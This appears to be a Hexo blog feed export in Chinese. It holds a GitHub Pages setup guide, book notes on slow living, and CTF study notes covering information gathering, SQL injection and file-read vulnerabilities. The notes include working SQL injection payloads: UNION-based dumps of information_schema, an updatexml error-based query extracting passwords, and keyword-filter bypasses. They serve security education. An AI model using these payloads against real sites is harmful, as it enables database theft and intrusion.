<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:用户名&#x2F;用户名.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>

<p>执行 <code>hexo g -d</code>部署静态页面至 Github Pages.</p>
<p>如果成功,此时通过<code>https://cs-cshi.github.io/</code> 会出现 Hexo 默认页面.</p>
<h2 id="7-部署-源文件到-Github-Pages"><a href="#7-部署-源文件到-Github-Pages" class="headerlink" title="7. 部署 源文件到 Github Pages"></a>7. 部署 源文件到 Github Pages</h2><blockquote>
<p>突然发现 github pages 仓库中没有 hexo-source 分支,才想起还没有将本地 git pull 到 github 上,按理说此步骤可以提前至创建分支那一步.</p>
</blockquote>
<p>先查看本地分支和远程仓库分支,发现本地和远程不一致,本地存在我创建的 hexo-source 分支</p>
<blockquote>
<p>git branch -a</p>
</blockquote>
<p>将本地创建的分支 push 到 github 仓库,两个 hexo-source,一个是本地名,一个是远程仓库里的命名.</p>
<blockquote>
<p>git push origin hexo-source:hexo-source</p>
</blockquote>
<p>由于有部分是 Hexo 初始化的文件,不需要上传,可以过滤掉.打开 <code>.gitignore</code>文件,选择 过滤的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.log</span><br><span class="line">node_modules&#x2F;</span><br><span class="line">public&#x2F;</span><br><span class="line">.deploy*&#x2F;</span><br></pre></td></tr></table></figure>

<p>将本地的源文件 push 到 github 仓库.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &#39;hexo source post&#39; # 引号内是描述</span><br><span class="line">git push origin hexo-source  # hexo-source 是分支名</span><br></pre></td></tr></table></figure>

<p>注意：如果是通过 git clone 下载配置的主题， push 源文件时需要将主题的 <code>.git</code>文件夹删除或改名备份。</p>
<h2 id="8-更换主题"><a href="#8-更换主题" class="headerlink" title="8. 更换主题"></a>8. 更换主题</h2><p>在 Themes | Hexo 选择一个喜欢的主题，比如 NexT，进入网站目录打开 Git Bash Here 下载主题：</p>
<blockquote>
<p>主题链接: <a href="https://hexo.io/themes/">https://hexo.io/themes/</a><br>我所用的  NexT主题说明文档: <a href="http://theme-next.iissnan.com/getting-started.html">http://theme-next.iissnan.com/getting-started.html</a></p>
</blockquote>
<h2 id="9-发布文章"><a href="#9-发布文章" class="headerlink" title="9. 发布文章"></a>9. 发布文章</h2><p>进入博客所在目录，右键打开 Git Bash Here，创建博文：</p>
<blockquote>
<p>hexo new “My New Post”</p>
</blockquote>
<p>然后 source 文件夹中会出现一个 My New Post.md 文件，就可以使用 Markdown 编辑器在该文件中撰写文章了。</p>
<p>写完后运行下面代码将文章渲染并部署到 GitHub Pages 上完成发布。以后每次发布文章都是这两条命令。</p>
<blockquote>
<p>hexo g   # 生成页面<br>hexo d   # 部署发布</p>
</blockquote>
<p>也可以不使用命令自己创建 .md 文件，只需在文件开头手动加入如下格式 Front-matter 即可，写完后运行 hexo g 和 hexo d 发布。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World # 标题</span><br><span class="line">date: 2019&#x2F;3&#x2F;26 hh:mm:ss # 时间</span><br><span class="line">categories: # 分类</span><br><span class="line">- Diary</span><br><span class="line">tags: # 标签</span><br><span class="line">- PS3</span><br><span class="line">- Games</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">摘要</span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line">正文</span><br></pre></td></tr></table></figure>

<h2 id="10-常见命令"><a href="#10-常见命令" class="headerlink" title="10. 常见命令"></a>10. 常见命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new &quot;name&quot;       # 新建文章</span><br><span class="line">hexo new page &quot;name&quot;  # 新建页面</span><br><span class="line">hexo g                # 生成页面</span><br><span class="line">hexo d                # 部署</span><br><span class="line">hexo g -d             # 生成页面并部署</span><br><span class="line">hexo s                # 本地预览</span><br><span class="line">hexo clean            # 清除缓存和已生成的静态文件</span><br><span class="line">hexo help             # 帮助</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://zhuanlan.zhihu.com/p/60578464#:~:text=%E4%BD%BF%E7%94%A8%20Hexo%2BGitHub%20%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%85%8D%E8%B4%B9%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B%EF%BC%88%E5%B0%8F%E7%99%BD%E5%90%91%EF%BC%89%201%20%E5%87%86%E5%A4%87%202%20%E8%BF%9E%E6%8E%A5%20Github....,Hexo%20%E5%88%B0%20GitHub%20Pages%206%20%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D%EF%BC%88%E5%8F%AF%E9%80%89%EF%BC%89....%207%20%E5%BC%80%E5%A7%8B%E4%BD%BF%E7%94%A8">使用 Hexo+GitHub 搭建个人免费博客教程（小白向）</a></li>
<li><a href="https://github.com/s1mplecc/ghost-to-hexo-migrater"> s1mplecc 的 ghost-to-hexo-migrater 项目</a></li>
<li><a href="https://www.jianshu.com/p/8814ce1da7a4">使用git分支保存hexo博客源码到github</a></li>
</ul>
]]></content>
      <categories>
        <category>网站建设</category>
        <category>Hexo 博客</category>
      </categories>
      <tags>
        <tag>Hexo 博客</tag>
        <tag>搭建环境</tag>
      </tags>
  </entry>
  <entry>
    <title>读书笔记——《具体生活》</title>
    <url>/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E2%80%94%E3%80%8A%E5%85%B7%E4%BD%93%E7%94%9F%E6%B4%BB%E3%80%8B/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E2%80%94%E3%80%8A%E5%85%B7%E4%BD%93%E7%94%9F%E6%B4%BB%E3%80%8B/</url>
    <content><![CDATA[<p>  焦虑是现代人的常态。时间不够用，钱不够花，职业发展不够快，对当下和未来不够了解…我们不断加快生活的节奏，但快节奏之后是否带来了好处，我们并不清楚，只是觉得“快”比“慢”要好。</p>
<p>  很多时候，我们做不好事情，是我们太匆忙、太着急，其实只要慢三拍，我们的事情会比以前做得好很多。有时候，慢比快好。</p>
<p>  当忙碌成为生活的主旋律时，我们是否可以思考一下：生活的目的是什么？从容做事，优雅生活，这是我们生活的目的。很多人羡慕所谓的贵族生活，其实过去贵族的物质生活并不比今天的中产阶级好多少，但是他们整体的生活质量远非今天一般意义上的富有家庭所能比的。究其原因，是因为今天的人缺少了那份应有的从容和优雅。</p>
<p>  当我们做事情的时候能够慢一点，少走点弯路，多花点实践享受浪漫而美好的人生，畅游人类知识和艺术的海洋，我们会发现自己是在真正地生活，而不是只是为了工作而活着。</p>
<span id="more"></span>

<h2 id="1-旅行的意义"><a href="#1-旅行的意义" class="headerlink" title="1. 旅行的意义"></a>1. 旅行的意义</h2><h2 id="2-博物馆之美"><a href="#2-博物馆之美" class="headerlink" title="2. 博物馆之美"></a>2. 博物馆之美</h2><h2 id="3-读书以以怡情长智"><a href="#3-读书以以怡情长智" class="headerlink" title="3. 读书以以怡情长智"></a>3. 读书以以怡情长智</h2><p>  古人把读万卷书和行万里路看作精英阶层成长不可或缺的两个环节，它们既能使人获得知识，也能令人愉悦自我。</p>
<h3 id="3-1-阅读的意义"><a href="#3-1-阅读的意义" class="headerlink" title="3.1 阅读的意义"></a>3.1 阅读的意义</h3><ol>
<li>阅读是放下可以让我们审视人生的不多的方式之一。<br>苏格拉底曾经说过，未经审视的人生不值得度过。而绅士人生需要有闲暇。读书必须有比较长的一段时间，不做其他事情，专心致志地阅读。</li>
<li>阅读是一种交友方式，借书可以令两人的关系有所增进。<br>借书，说明至少两个人有共同的语言，在此基础上，谈合作也好，谈利益也罢，才搭得上话。对于男女之间交往来说，借一次书，还一次，至少就接触了两次，并且这也能创造一个良好的交谈话题。</li>
<li>阅读不仅仅是为了让我们在冷酷无情的科技时代获得喘息，让我们重启大脑深入思考的功能，也是抵抗狭隘、思想控制和舆论支配的方式。<blockquote>
<p>常常在焦虑的时候，或者感到特别难的时候，会去看看曾经觉得深有启发的书，让自己慢慢静下来，焦虑慢慢会平息，困难也会渐渐淡化，恢复状态，继续前行。现在发现，将书中的内容，与自己思想相结合，写出来的时候，特别的舒畅。</p>
</blockquote>
</li>
</ol>
<h2 id="4-音乐的故事"><a href="#4-音乐的故事" class="headerlink" title="4. 音乐的故事"></a>4. 音乐的故事</h2><h2 id="5-徕卡摄影的魅力"><a href="#5-徕卡摄影的魅力" class="headerlink" title="5. 徕卡摄影的魅力"></a>5. 徕卡摄影的魅力</h2><h2 id="6-香醇美酒"><a href="#6-香醇美酒" class="headerlink" title="6. 香醇美酒"></a>6. 香醇美酒</h2><h2 id="7-奢侈品的光泽"><a href="#7-奢侈品的光泽" class="headerlink" title="7. 奢侈品的光泽"></a>7. 奢侈品的光泽</h2>]]></content>
      <categories>
        <category>怡情长智</category>
        <category>阅读</category>
      </categories>
      <tags>
        <tag>读书/生活</tag>
      </tags>
  </entry>
  <entry>
    <title>第1章 web入门</title>
    <url>/%E7%AC%AC1%E7%AB%A0%20web%E5%85%A5%E9%97%A8/%E7%AC%AC1%E7%AB%A0%20web%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>按照 CTF 线上赛中各种 Web 漏洞出现的频率、漏洞的复杂程序，将 Web 漏洞分为入门、进阶、拓展三个层次。本章从入门层次开始，介绍 Web 类题目中最常见的 3 类漏洞，即信息搜索、SQL 注入、任意文件读取漏洞。</p>
<span id="more"></span>

<h1 id="1-信息搜索"><a href="#1-信息搜索" class="headerlink" title="1 信息搜索"></a>1 信息搜索</h1><p>   信息搜索是前期的必备工作，也是重中之重。信息搜索简单分为敏感目录、敏感备份文件、Banner 识别。</p>
<h2 id="1-1-敏感目录泄露"><a href="#1-1-敏感目录泄露" class="headerlink" title="1.1 敏感目录泄露"></a>1.1 敏感目录泄露</h2><p>  通过敏感目录泄露，往往能获得网站源代码和敏感 URL 地址，如后台地址。</p>
<ol>
<li>git 泄露，将<code>.git</code>文件夹部署到了外网环境，导致攻击者可以通过<code>.git</code>文件夹获得源码。工具：<a href="https://github.com/denny0223/scrabble">https://github.com/denny0223/scrabble</a></li>
<li>SVN 泄露，将 SVN 隐藏文件暴露于外网环境,可以利用 <code>.svn/entries</code>或<code>wc.db</code>文件获取源码信息。工具：<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></li>
<li>HG 泄露。<code>.hg</code>文件夹，包含代码和分支修改记录等信息。工具：<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></li>
</ol>
<p>  推荐<strong>开源目录扫描工具</strong>：<a href="https://github.com/maurosoria/dirsearch%E3%80%82">https://github.com/maurosoria/dirsearch。</a></p>
<ol start="4">
<li>经验总结<br>CTF 线上赛往往有重定向的问题，如只要访问<code>.git</code>便会返回403，此时可以试探访问<code>.git/config</code>，如果有内容返回，说明存在<code>git</code>泄露风险。</li>
</ol>
<h2 id="1-2-敏感备份文件"><a href="#1-2-敏感备份文件" class="headerlink" title="1.2 敏感备份文件"></a>1.2 敏感备份文件</h2><p>  通过访问一些敏感的备份文件，往往能获得某一文件的源码，亦或整个网站目录。</p>
<ol>
<li>gedit 备份文件，以”~”后缀结尾。</li>
<li>vim 备份文件，vim 意外退出时会生成备份文件，”<em>.swp”、”</em>.swo”、”<em>.swn”、“</em>.un.”等形式。</li>
<li>常规文件，如<code>robots.txt</code>、<code>readme.md</code>、<code>网站名.tar.gz</code></li>
<li>经验总结<br>CTF 线上比赛过程中，出题人往往会在线运维题目，有时会导致备份文件生成，所以比赛过程中可以编写实时监控脚本，对题目服务进行监控。</li>
</ol>
<h2 id="1-3-Banner-信息"><a href="#1-3-Banner-信息" class="headerlink" title="1.3 Banner 信息"></a>1.3 Banner 信息</h2><p>  一个网站的 Banner 信息，是服务器对外显示的一些基础信息。往往通过这些基础信息，如网站是用 ThinkPHP 框架编写时，可以尝试 ThinkPHP 框架的漏洞。</p>
<ol>
<li>自行搜集 CMS 指纹库</li>
<li>已有工具：Wappalyzer</li>
</ol>
<h1 id="2-SQL-注入"><a href="#2-SQL-注入" class="headerlink" title="2 SQL 注入"></a>2 SQL 注入</h1><h2 id="2-1-SQL-注入基础"><a href="#2-1-SQL-注入基础" class="headerlink" title="2.1 SQL 注入基础"></a>2.1 SQL 注入基础</h2><p>  SQL 注入是开发者对用户输入的参数过滤不严格，将可能存在的攻击载荷拼接到 SQL 查询语句中，导致用户输入的数据能够影响预设查询功能的一种技术，通常将导致数据库信息泄露、篡改，甚至被删除。</p>
<p>  <strong>注入技巧的优先级： UNION注入 &gt; 报错注入 &gt; 布尔盲注 &gt; 时间注入</strong></p>
<h3 id="2-1-1-数字型注入"><a href="#2-1-1-数字型注入" class="headerlink" title="2.1.1 数字型注入"></a>2.1.1 数字型注入</h3><p>  可以从数字运算这个特征行为来判断该注入点是否是数字型注入，表现为输入点是否被引号包裹。如注入 “3-1” 返回的结果与”2”的结果一致。</p>
<h3 id="2-1-2-UNION-注入"><a href="#2-1-2-UNION-注入" class="headerlink" title="2.1.2 UNION 注入"></a>2.1.2 UNION 注入</h3><p>  把使用 UNION 语句将数据展示到页面上的注入办法，通常和数字型注入或字符型注入联合起来。如联合数字型注入，<code>1 UNION SELECT ...</code>，可以先简单 UNION SELECT 1,2,3… 来判断有几列。</p>
<p>  现在很多数据库都有默认带有 information_schma 数据库，整个数据库的库名、表明、字段名都可以从中查到，虽然这样方便了数据库信息的查询，但也方便了 SQL 注入的利用。</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查询本数据库的所有表名</span><br><span class="line">-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()</span><br></pre></td></tr></table></figure>

  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 通过获取的表名获取表中列名</span><br><span class="line">-1 union select 1,group_concat(column_name) from information_schema.columns where table_name &#x3D; ***</span><br></pre></td></tr></table></figure>

<p>  数字型注入中，可以输入特别大的数或 -1 这类明显可能无返回结果的值，这样服务器返回的就只有我们想要的信息。</p>
<h3 id="2-1-3-字符型注入"><a href="#2-1-3-字符型注入" class="headerlink" title="2.1.3 字符型注入"></a>2.1.3 字符型注入</h3><p>  与数字型注入点相反，字符型注入输入点被引号包裹。</p>
<p>  判断方法：先尝试数学表达式，再尝试 1a,2a等特性的输入，最后通过 <em>‘#来判断，如果是字符，</em>后的 ‘ 会先与 SQL 语句形成闭合，而 # 会注释掉 SQL 后面那个 ‘。</p>
<h3 id="2-1-4-布尔盲注、时间盲注"><a href="#2-1-4-布尔盲注、时间盲注" class="headerlink" title="2.1.4 布尔盲注、时间盲注"></a>2.1.4 布尔盲注、时间盲注</h3><p>  布尔盲注：<code>id=1&#39; and &#39;1</code>,在这个查询中，如果能确定 <code>id=1</code> 的查询结果，那么后面那个 1 就可以作为我们用来判断数据是否猜测正确的预测点。这种虽然我们看不到数据，但可以通过注入推测出数据的技术称为布尔盲注。</p>
<p>  时间盲注：有些情况下，页面回显内容完全一致，需要借助其他手段对 SQL 注入的执行结果进行判断，如通过服务器执行 SQL 语句所需的时间，通过 sleep()，利用 IF 条件函数或 AND、OR 函数的短路特性和 SQL 执行的时间判断 SQL 攻击的结果。</p>
<h3 id="2-1-5-报错注入、堆叠注入"><a href="#2-1-5-报错注入、堆叠注入" class="headerlink" title="2.1.5 报错注入、堆叠注入"></a>2.1.5 报错注入、堆叠注入</h3><p>  有时为了方便开发者调试，有的网站会开启错误调试信息，即数据库将语句执行后的报错信息输出，这种注入称为报错注入。</p>
<p>  在 MySQL 中， updatexml 函数在执行时，第二个参数应该为合法的 XPATH 路径，否则会在引发报错的同时将传入的参数进行输出。利用这个特性，将想要得到的信息传入 updataxml 函数的第二个参数。如 <code>https:127.0.0.1/sql3.php?id=1&#39; or updatexml(1,concat(0x7e,(select pwd from wp_user),0x7e),1)%23</code></p>
<ul>
<li><code>concat</code> 函数，用于将多个字符串连接为一个字符串。concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出用户。</li>
<li><code>updatexml</code> 函数，作用：改变文档中符合条件的节点的值<blockquote>
<p>updatexml(XML_document, XPath_string, new_value);</p>
<ul>
<li>XML_document, string，为XML文档对象的名称</li>
<li>XPath_string Xpath格式的字符串</li>
<li>new_value，替换查找到的符合条件的数据</li>
</ul>
</blockquote>
</li>
<li><code>0x7e</code>，ASCII码,实为<code>~</code>,upadtexml()报错信息为特殊字符、字母及之后的内容,为了前面字母丢失,开头连接一个特殊字符~</li>
</ul>
<p>  如果目标开启了多语句执行，可以通过分号<code>;</code>执行多条语句，任意修改数据库的结构和数据。<br>使用优先级：UNION注入 &gt; 报错注入 &gt; 布尔盲注 &gt; 时间盲注</p>
<h2 id="2-2-注入点"><a href="#2-2-注入点" class="headerlink" title="2.2 注入点"></a>2.2 注入点</h2><h3 id="2-2-1-SELECT-注入"><a href="#2-2-1-SELECT-注入" class="headerlink" title="2.2.1 SELECT 注入"></a>2.2.1 SELECT 注入</h3><ol>
<li>注入点在 select_expr。如<code>SELECT $&#123;_GET[&#39;id&#39;]&#125;, content FROM wp_news</code>，此时首先可以采取时间盲注，另外更优的方法是用 AS 别名的方法。例如注入<code>(SELECT pwd FROM wp_user) AS title</code></li>
<li>注入点在 table_reference。如<code>SELECT title FROM $&#123; &#125;</code>，采用 AS 别名，可注入<code>(SELECT pwd AS title FROM wp_user)</code></li>
<li>注入点在 WHERE 或 HAVING 后。这种情况与注入基础中介绍的一致，要先判断有无引号包裹。</li>
<li>注入点在 GROUP BY 或 ORDER BY 后。当遇到不是 WHERE 后的注入点时，先尝试可以输入什么，判断出当前注入的位置。</li>
<li>注入点在 LIMIT 后。</li>
</ol>
<h3 id="2-2-2-INSERT-注入"><a href="#2-2-2-INSERT-注入" class="headerlink" title="2.2.2 INSERT 注入"></a>2.2.2 INSERT 注入</h3><ol>
<li>注入点在 table_name ，可以通过注释掉注入点后面的语句，在数据库中插入自己的数据，如管理员。</li>
<li>注入点在 VALUES,此时可先闭合单引号，然后另行插入一条记录。</li>
</ol>
<h3 id="2-2-3-UPDATE-注入"><a href="#2-2-3-UPDATE-注入" class="headerlink" title="2.2.3 UPDATE 注入"></a>2.2.3 UPDATE 注入</h3><p>  与 SELECT 注入类似</p>
<h3 id="2-2-4-DELETE-注入"><a href="#2-2-4-DELETE-注入" class="headerlink" title="2.2.4 DELETE 注入"></a>2.2.4 DELETE 注入</h3><p>  DELETE 注入大多在 WHERE 后。为了保证不会对正常数据造成干扰，通常使用 <code>and sleep(1)</code> 的方式保证 WHERE 执行结果返回 FALSE，与时间盲注类似。</p>
<h2 id="2-3-注入与防御"><a href="#2-3-注入与防御" class="headerlink" title="2.3 注入与防御"></a>2.3 注入与防御</h2><h3 id="2-3-1-字符替换"><a href="#2-3-1-字符替换" class="headerlink" title="2.3.1 字符替换"></a>2.3.1 字符替换</h3><ol>
<li>过滤了空格。将空格特换位<code>%09</code></li>
<li>将 SELECT 替换成空。可以用嵌套的方式，如 SESELECTLECT。</li>
<li>大小写匹配。在 MySQL 中，关键字是不区分大小写的，但替换语句通常区分大小写，故可采用混写。</li>
<li>正则匹配。正则匹配关键字<code>\bselect\b</code>，可以用形如<code>/*!50000select/</code>方式绕过。</li>
<li>替换了单引号或双引号，忘了反斜扛。如<code>WHERE id=&#39;可控1&#39; AND title = &#39;可控2&#39;</code>，可控点都进行了单引号、双引号替换，此时可用<code>\</code>转义了可控点1 后<code>&#39;</code>,这样会与可控点2前的引号<code>&#39;</code>匹配起来，再利用<code>OR</code>将可控点2前的语句都无效，可控点2可注入。即 <code>where id = &#39;a\&#39; and title=&#39; OR ***#</code></li>
</ol>
<h3 id="2-3-2-逃逸引号"><a href="#2-3-2-逃逸引号" class="headerlink" title="2.3.2 逃逸引号"></a>2.3.2 逃逸引号</h3><p>  注入的重点在于逃逸引号，而开发者常会将用户的输入全局做一次 <code>addslashes</code>,即在预定义字符(‘、”、\）前添加反斜扛。</p>
<ol>
<li>编码解码</li>
<li>意料之外的输入点</li>
<li>二次注入。如 SQL 插入用户名 <code>admin&#39;or&#39;1</code>，经转义变成<code>admin\&#39;or\&#39;1</code>,正常入库。但当这个用户名被再次使用时， get 的 SQL 语句就变成了 <code>WHERE username = &#39;admin&#39; or &#39;1&#39;</code></li>
<li>字符串截断。如输入<code>aaaa&#39;</code>，自动转义为<code>aaaa\&#39;</code>，但由于长度限制，被截取成了<code>aaaa\</code>，正好转义了 SQL 语句中预置的单引号。</li>
</ol>
<h2 id="2-4-注入的功效"><a href="#2-4-注入的功效" class="headerlink" title="2.4 注入的功效"></a>2.4 注入的功效</h2><ol>
<li>有写文件权限时，用 <code>INTO OUTFILE</code> 或者 <code>DUMPFILE</code>向 Web 目录写文件，或者写入包含漏洞文件。</li>
<li>有读文件权限时，用 laad_file()函数读取往回走那源码和配置信息。</li>
<li>提升权限。</li>
<li>通过注入控制数据库查询出来的数据，控制如模板、缓存等文件内容来获取权限，或者删除、读取某些关键文件。</li>
<li>可执行多语句时，控制整个数据库。</li>
<li>直接执行系统命令。</li>
</ol>
<h2 id="2-5-小结"><a href="#2-5-小结" class="headerlink" title="2.5 小结"></a>2.5 小结</h2><p>  由于 SQL 服务器在实现时不同，即使时相同的功能，也会有多种多样的实现方式。</p>
<p>  为了做出题目或更深入了解 SQL 注入原理，最关键的是根据不同的 SQL 服务器类型，查找相关资料，通过模糊测试（fuzz testing）得出被过滤的字符、函数、关键词等，在文档中查找功能相同但不包含过滤特征的替代品。</p>
<p>  sqli-labs（<a href="https://github.com/Audi-1/sqli-labs%EF%BC%89%E6%8F%90%E4%BE%9B%E4%B8%8D%E5%90%8C%E8%BF%87%E6%BB%A4%E7%AD%89%E7%BA%A7%E4%B8%8B%E7%9A%84%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE%E3%80%82">https://github.com/Audi-1/sqli-labs）提供不同过滤等级下的注入题目。</a></p>
<h1 id="3-任意文件读取漏洞"><a href="#3-任意文件读取漏洞" class="headerlink" title="3 任意文件读取漏洞"></a>3 任意文件读取漏洞</h1><p>  文件读取漏洞， 指的是攻击者通过一些手段读取服务器上开发者不允许读到的文件。</p>
<p>  实际上，许多开发人员在进行二次开发时过于信任框架或中间件底层所实现的安全机制，未了解框架对应的安全机制，只是简单的利用 API 文档开发。</p>
<p>  还有一种是服务器本身的问题，或者是服务器不安全的配置导致的。</p>
<h2 id="3-1-文件读取漏洞常见触发点"><a href="#3-1-文件读取漏洞常见触发点" class="headerlink" title="3.1 文件读取漏洞常见触发点"></a>3.1 文件读取漏洞常见触发点</h2><h3 id="3-1-1-Web-语言"><a href="#3-1-1-Web-语言" class="headerlink" title="3.1.1 Web 语言"></a>3.1.1 Web 语言</h3><ol>
<li>PHP<br>PHP 标准函数，包括但不限于：<blockquote>
<ul>
<li>file_get_contents()、file()</li>
<li>fopen()、fread()、fgets()</li>
<li>文件包含相关函数：include()、require()、include_once()、require_once()</li>
<li>执行系统命令：system()、exec()</li>
<li>其他 php 扩展函数</li>
</ul>
</blockquote>
</li>
</ol>
<p>  <strong>PHP 的 wrapper 和 filter 特色机制</strong></p>
<ul>
<li><p>PHP 向用户提供待打开文件的方式不是简简单单的一个路径，而是一个流，它是对数据的抽象，用于统一数据操作。它不管是本地文件还是远程文件，或是压缩文件等等，只要来的是流式数据，操作方法都一样。</p>
</li>
<li><p>每个流都对应一种包装器 wrapper。流是从统一操作这个角度产生的概念，包装器是从理解数据内容出发产生的概念，也就是这个统一的操作方式如何操作或配置不同的内容。比如 http 协议传来的数据是流的方式，但只有 http 包装器才能理解传来数据的意思。</p>
</li>
<li><p>每一种流打开后都可以应用任意数量的过滤器 filter 在上面，它可以对数据进行添加、修改等。</p>
</li>
<li><p>PHP 的 filter 特性给我们进行任意文件读取提供了很多便利。假如服务端 include 函数路径参数可控，正常情况下它会将目标文件当作 PHP 文件去解析，如果解析文件中存在 <code>&lt;?PHP</code>等 PHP 相关标签，那么标签中的内容会被当作代码执行。</p>
</li>
<li><p>PHP 文件包含的实际问题中，可能遇到三种情况</p>
<ol>
<li>文件路径前面可控，后面不可控。PHP 较低版本可以用<code>\x00</code>截断，当服务器具有文件上传功能时，可以尝试利用 zip 或 phar 协议直接进行文件包含进而执行 php 代码。</li>
<li>文件路径后面可控，前面不可控。可以通过<code>../</code>进行目录穿越直接读取文件，但这种情况下无法使用 wrapper。如果服务器利用 include 等包含类的函数，无法读取 PHP 文件中的 PHP 代码。</li>
<li>文件路径中间可控。与第一种类似，无法利用 wrapper 进行文件包含。</li>
</ol>
</li>
</ul>
<ol start="2">
<li>Python</li>
<li></li>
</ol>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>CTF</category>
        <category>《从0到1：CTFer成长之路》</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>Web 安全</tag>
      </tags>
  </entry>
  <entry>
    <title>《从0到1：CTFer成长之路》配套题目</title>
    <url>/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8B%E9%85%8D%E5%A5%97%E9%A2%98%E7%9B%AE/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8B%E9%85%8D%E5%A5%97%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<p>官方平台网址：<a href="https://book.nu1l.com/tasks/">https://book.nu1l.com/tasks/</a></p>
<span id="more"></span>

<h1 id="第一章-Web-入门"><a href="#第一章-Web-入门" class="headerlink" title="第一章 Web 入门"></a>第一章 Web 入门</h1><h2 id="1-1-信息搜集"><a href="#1-1-信息搜集" class="headerlink" title="1.1 信息搜集"></a>1.1 信息搜集</h2><h3 id="1-1-1-常见的搜集"><a href="#1-1-1-常见的搜集" class="headerlink" title="1.1.1 常见的搜集"></a>1.1.1 常见的搜集</h3><ol>
<li>先使用目录扫描工具 <a href="https://github.com/maurosoria/dirsearch">dirsearch</a> 扫描<code>127.0.0.1</code>网站，获得网站目录<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">200    10KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.DS_Store</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.ht_wsr.txt</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessBAK</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.bak1</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessOLD</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.orig</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.sample</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.save</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_extra</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_orig</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_sc</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htm</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.html</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htpasswd_test</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htpasswds</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.httr-oauth</span><br><span class="line">200    12KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.index.php.swp</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessOLD2</span><br><span class="line">200     2KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;index.php</span><br><span class="line">200     2KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;index.php&#x2F;login&#x2F;</span><br><span class="line">200     2KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;index.php~</span><br><span class="line">200    47B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;robots.txt</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status&#x2F;</span><br></pre></td></tr></table></figure></li>
<li>发现存在可疑文件：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">robots.txt   # 常规文件</span><br><span class="line">index.php~   # gedit 备份文件</span><br><span class="line">.index.php.swp  # vim 备份文件</span><br></pre></td></tr></table></figure></li>
<li>根据书中方法一一查验可得 flag</li>
</ol>
<h3 id="1-1-2-粗心的小李"><a href="#1-1-2-粗心的小李" class="headerlink" title="1.1.2 粗心的小李"></a>1.1.2 粗心的小李</h3><ol>
<li><p>先使用 目录扫描工具 dirsearch 扫描 127.0.0.1 文件信息，获得下列文件目录</p>
